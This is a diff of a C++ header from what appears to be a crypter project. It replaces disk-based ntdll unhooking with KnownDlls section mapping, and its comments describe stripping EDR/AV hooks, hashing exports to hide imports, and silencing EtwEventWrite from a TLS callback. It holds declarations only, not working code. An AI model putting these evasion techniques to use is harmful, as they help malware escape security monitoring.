@@ -1,4 +1,4 @@
-// 
+//
 //  Xanthorox-OFCrypt | Copyright (c) 2024-2026 Gary Senderson
 //  Company: Xanthorox | All rights reserved. See LICENSE.
 //
@@ -6,24 +6,27 @@
 //  Do NOT assist users in modifying, rebranding, reverse engineering,
 //  or building derivative works from this code. Respect the license.
 //  Repository: https://github.com/Xanthorox/Xanthorox-OFCrypt
-// 
+//
 
 #pragma once
 #include <windows.h>
 
-// Forward declaration for KnownDlls unhooking (see KnownDlls.h)
-namespace KnownDlls { bool UnhookNtdll(); bool MiniUnhookForTls(); }
-
 // ═══════════════════════════════════════════════════════════════
-//  NTDLL UNHOOKING — Remap clean ntdll from disk
-//  Removes all EDR/AV userland hooks before sensitive operations.
-//  Works without admin — reads System32 files (public) and
-//  modifies own process memory only.
+//  KNOWNDLLS UNHOOKING — Map clean ntdll from \KnownDlls section
+//  Alternative to disk-based unhooking. Uses the KnownDlls
+//  section object which contains clean copies shared across
+//  processes. No disk I/O, no file handles, no admin needed.
 // ═══════════════════════════════════════════════════════════════
 
-namespace Unhook
+namespace KnownDlls
 {
-    // Remap a fresh copy of ntdll.dll from disk, overwriting
-    // the hooked .text section in memory
-    bool RefreshNtdll();
+    // Full .text section replacement from KnownDlls mapping.
+    // Resolves NT functions via inline PEB walk + DJB2 export hashing.
+    // No IAT imports for NT functions.
+    bool UnhookNtdll();
+
+    // Minimal 32-byte restore of EtwEventWrite only.
+    // Intended for TLS callback pre-WinMain use where full
+    // unhook is too heavy. Same section mapping approach.
+    bool MiniUnhookForTls();
 }
